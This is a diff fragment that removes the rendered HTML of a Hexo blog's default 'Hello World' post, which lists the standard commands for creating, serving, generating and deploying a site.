-      <meta itemprop="name" content="x4297's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/14/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-14 15:27:58" itemprop="dateCreated datePublished" datetime="2022-01-14T15:27:58+08:00">2022-01-14</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
       
     </div>
